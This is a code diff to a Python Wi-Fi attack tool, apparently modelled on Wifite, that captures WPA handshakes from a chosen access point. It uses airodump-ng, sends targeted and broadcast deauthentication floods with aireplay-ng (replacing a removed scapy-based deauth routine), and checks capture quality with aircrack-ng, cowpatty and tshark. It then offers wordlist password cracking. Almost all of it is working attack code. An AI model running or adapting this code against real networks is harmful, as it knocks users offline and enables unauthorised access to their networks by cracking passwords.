@@ -421,7 +421,7 @@ class HandshakeCapture:
         return findings
 
     def start_capture(self):
-        """Start handshake capture with improved reliability"""
+        """Start handshake capture using Wifite-inspired approach"""
         if not self.check_dependencies():
             return
 
@@ -470,141 +470,109 @@ class HandshakeCapture:
             self.running = True
             cycle_count = 1
             max_cycles = 10
-            capture_process = None
             
             # Create unique capture file
             timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
             self.capture_file = get_capture_path(f'handshake_{self.target_bssid.replace(":", "")}_{timestamp}')
 
+            # Start airodump-ng for capture
+            capture_cmd = [
+                'airodump-ng',
+                '--bssid', self.target_bssid,
+                '--channel', self.target_channel,
+                '--write', self.capture_file,
+                '--output-format', 'pcap,csv',
+                '--write-interval', '1',  # Write every second
+                self.interface
+            ]
+            
+            capture_process = subprocess.Popen(
+                capture_cmd,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL
+            )
+
+            # Let capture initialize
+            time.sleep(2)
+
+            # Main capture loop
             while self.running and not self.handshake_captured and cycle_count <= max_cycles:
-                self.console.print(f"\n[cyan]Capture Cycle {cycle_count}/{max_cycles}[/cyan]")
+                self.console.print(f"\n[cyan]Handshake Capture Cycle {cycle_count}/{max_cycles}[/cyan]")
 
-                # Phase 1: Listen for 30 seconds to identify active clients
-                self.console.print("\n[yellow]Phase 1: Monitoring for active clients (30s)...[/yellow]")
+                # Phase 1: Initial client detection (10 seconds)
+                self.console.print("\n[yellow]Phase 1: Detecting active clients...[/yellow]")
+                time.sleep(10)
                 
-                # Start capture process
-                capture_cmd = [
-                    'airodump-ng',
-                    '--bssid', self.target_bssid,
-                    '--channel', self.target_channel,
-                    '--write', self.capture_file,
-                    '--output-format', 'pcap,csv',
-                    self.interface
-                ]
+                # Get current clients
+                clients = self.get_connected_clients()
                 
-                capture_process = subprocess.Popen(
-                    capture_cmd,
-                    stdout=subprocess.DEVNULL,
-                    stderr=subprocess.DEVNULL
-                )
-
-                # Monitor for clients every 2 seconds during 30-second listen cycle
-                active_clients = set()
-                for _ in range(15):  # 30 seconds total, check every 2 seconds
-                    clients = self.get_connected_clients()
-                    active_clients.update(clients)
-                    time.sleep(2)
+                if clients:
+                    self.console.print(f"[green]Found {len(clients)} connected clients[/green]")
                     
-                    # Early check for handshake
-                    if os.path.exists(f"{self.capture_file}-01.cap"):
-                        if self.check_for_handshake():
-                            self.handshake_captured = True
-                            break
-
-                if self.handshake_captured:
-                    break
-
-                # Phase 2: Targeted deauth if clients found
-                if active_clients:
-                    self.console.print(f"\n[yellow]Phase 2: Found {len(active_clients)} active clients[/yellow]")
+                    # Phase 2: Targeted deauth with aireplay-ng
+                    self.console.print("\n[yellow]Phase 2: Targeted client deauthentication[/yellow]")
                     
-                    for client in active_clients:
+                    for client in clients:
                         if not self.running:
                             break
-
+                            
                         self.console.print(f"[cyan]Targeting client: {client}[/cyan]")
                         
-                        # Send 5-second deauth cycle
-                        for _ in range(5):  # 5 bursts of deauth
-                            try:
-                                # Send to client
-                                deauth_to_client = RadioTap() / Dot11(
-                                    type=0,
-                                    subtype=12,
-                                    addr1=client,
-                                    addr2=self.target_bssid,
-                                    addr3=self.target_bssid
-                                ) / Dot11Deauth(reason=7)
-                                
-                                # Send to AP
-                                deauth_to_ap = RadioTap() / Dot11(
-                                    type=0,
-                                    subtype=12,
-                                    addr1=self.target_bssid,
-                                    addr2=client,
-                                    addr3=self.target_bssid
-                                ) / Dot11Deauth(reason=7)
-
-                                # Send burst
-                                sendp(deauth_to_client, iface=self.interface, count=2, verbose=False)
-                                sendp(deauth_to_ap, iface=self.interface, count=2, verbose=False)
-                                time.sleep(1)  # 1-second spacing between bursts
-                                
-                                # Check for handshake after each burst
-                                if os.path.exists(f"{self.capture_file}-01.cap"):
-                                    if self.check_for_handshake():
-                                        self.handshake_captured = True
-                                        break
-                                        
-                            except Exception as e:
-                                self.console.print(f"[red]Error sending deauth: {str(e)}[/red]")
-                                continue
-
-                        if self.handshake_captured:
-                            break
-                            
-                        # Wait 5 seconds after each client for reconnection
-                        self.console.print("[cyan]Waiting for reconnection...[/cyan]")
-                        time.sleep(5)
+                        # Send deauth to client and AP using aireplay-ng
+                        deauth_cmd = [
+                            'aireplay-ng',
+                            '--deauth', '2',  # Send 2 deauth packets
+                            '-a', self.target_bssid,  # Target AP
+                            '-c', client,  # Target client
+                            '--ignore-negative-one',
+                            self.interface
+                        ]
                         
-                        # Check for handshake again
-                        if os.path.exists(f"{self.capture_file}-01.cap"):
+                        # Send deauth bursts with delays
+                        for _ in range(2):  # 2 bursts
+                            subprocess.run(deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                            time.sleep(0.5)  # Short delay between bursts
+                            
+                            # Check for handshake
                             if self.check_for_handshake():
                                 self.handshake_captured = True
                                 break
-                else:
-                    # Phase 2 Alternative: Broadcast deauth if no clients found
-                    self.console.print("\n[yellow]Phase 2: No clients found, sending broadcast deauth...[/yellow]")
-                    
-                    broadcast_deauth = RadioTap() / Dot11(
-                        type=0,
-                        subtype=12,
-                        addr1="ff:ff:ff:ff:ff:ff",
-                        addr2=self.target_bssid,
-                        addr3=self.target_bssid
-                    ) / Dot11Deauth(reason=7)
-
-                    # Send 5 bursts of broadcast deauth
-                    for _ in range(5):
-                        try:
-                            sendp(broadcast_deauth, iface=self.interface, count=3, verbose=False)
-                            time.sleep(1)
+                        
+                        if self.handshake_captured:
+                            break
                             
-                            # Check for handshake
-                            if os.path.exists(f"{self.capture_file}-01.cap"):
-                                if self.check_for_handshake():
-                                    self.handshake_captured = True
-                                    break
-                        except Exception as e:
-                            self.console.print(f"[red]Error sending broadcast deauth: {str(e)}[/red]")
-
-                    # Wait longer for potential reconnections after broadcast
-                    if not self.handshake_captured:
-                        self.console.print("[cyan]Waiting for potential reconnections...[/cyan]")
-                        time.sleep(10)
-                        if os.path.exists(f"{self.capture_file}-01.cap"):
-                            if self.check_for_handshake():
-                                self.handshake_captured = True
+                        # Wait briefly for reconnection
+                        time.sleep(2)
+                else:
+                    # Phase 2 Alternative: Broadcast deauth
+                    self.console.print("\n[yellow]Phase 2: Broadcast deauthentication[/yellow]")
+                    
+                    # Use aireplay-ng for broadcast deauth
+                    broadcast_cmd = [
+                        'aireplay-ng',
+                        '--deauth', '2',  # Send 2 deauth packets
+                        '-a', self.target_bssid,  # Target AP
+                        '--ignore-negative-one',
+                        self.interface
+                    ]
+                    
+                    # Send multiple bursts
+                    for _ in range(2):  # 2 bursts
+                        subprocess.run(broadcast_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                        time.sleep(1)  # Longer delay for broadcast
+                        
+                        if self.check_for_handshake():
+                            self.handshake_captured = True
+                            break
+                
+                # Phase 3: Listen for handshake (5 seconds)
+                if not self.handshake_captured:
+                    self.console.print("\n[yellow]Phase 3: Listening for handshake...[/yellow]")
+                    for _ in range(5):
+                        time.sleep(1)
+                        if self.check_for_handshake():
+                            self.handshake_captured = True
+                            break
 
                 if self.handshake_captured:
                     break
@@ -628,16 +596,26 @@ class HandshakeCapture:
                     shutil.copy(f"{self.capture_file}-01.cap", save_path)
                     self.console.print(f"[green]Handshake saved to: {save_path}[/green]")
                     
-                    # Offer to crack
-                    self.console.print("\n[cyan]Would you like to attempt to crack the password? (y/n)[/cyan]")
-                    if input().lower() == 'y':
-                        if self.crack_cap_file():
-                            self.console.print("[green]Password cracking successful![/green]")
+                    # Verify handshake quality
+                    self.console.print("\n[yellow]Verifying handshake quality...[/yellow]")
+                    if self.verify_handshake_quality(save_path):
+                        self.console.print("[green]✓ Handshake verification passed![/green]")
+                        
+                        # Offer to crack
+                        self.console.print("\n[cyan]Would you like to attempt to crack the password? (y/n)[/cyan]")
+                        if input().lower() == 'y':
+                            if self.crack_cap_file():
+                                self.console.print("[green]Password cracking successful![/green]")
+                            else:
+                                self.console.print("[yellow]Password not found in wordlist.[/yellow]")
+                                self.gather_network_info()
                         else:
-                            self.console.print("[yellow]Password not found in wordlist.[/yellow]")
                             self.gather_network_info()
                     else:
-                        self.gather_network_info()
+                        self.console.print("[red]× Handshake verification failed - poor quality capture[/red]")
+                        self.console.print("[yellow]Continuing capture process...[/yellow]")
+                        self.handshake_captured = False
+                        cycle_count -= 1  # Don't count this cycle
             else:
                 self.console.print("\n[yellow]No handshake captured after maximum cycles.[/yellow]")
                 self.gather_network_info()
@@ -647,12 +625,46 @@ class HandshakeCapture:
         finally:
             self.running = False
             try:
-                if capture_process:
+                if 'capture_process' in locals():
                     capture_process.terminate()
                 subprocess.run(['airmon-ng', 'stop', self.interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                 cleanup_temp_files()
             except:
                 pass
+
+    def verify_handshake_quality(self, capfile):
+        """Verify the quality of the captured handshake using multiple tools"""
+        try:
+            # Method 1: Aircrack-ng verification
+            aircrack_cmd = ['aircrack-ng', capfile]
+            result = subprocess.run(aircrack_cmd, capture_output=True, text=True)
+            if "1 handshake" not in result.stdout:
+                return False
+
+            # Method 2: Cowpatty verification (more strict)
+            try:
+                cowpatty_cmd = ['cowpatty', '-c', '-r', capfile]
+                result = subprocess.run(cowpatty_cmd, capture_output=True, text=True)
+                if "Collected all necessary data to mount crack" not in result.stdout:
+                    return False
+            except:
+                pass  # Cowpatty might not be installed
+
+            # Method 3: Check EAPOL message count with tshark
+            try:
+                tshark_cmd = ['tshark', '-r', capfile, '-Y', 'eapol']
+                result = subprocess.run(tshark_cmd, capture_output=True, text=True)
+                eapol_count = len(result.stdout.strip().split('\n'))
+                if eapol_count < 4:  # Need all 4 EAPOL messages
+                    return False
+            except:
+                pass  # Tshark might not be installed
+
+            return True
+
+        except Exception as e:
+            self.console.print(f"[red]Error verifying handshake: {str(e)}[/red]")
+            return False
 
     def check_for_handshake(self):
         """Check if we've captured a handshake using multiple verification methods"""
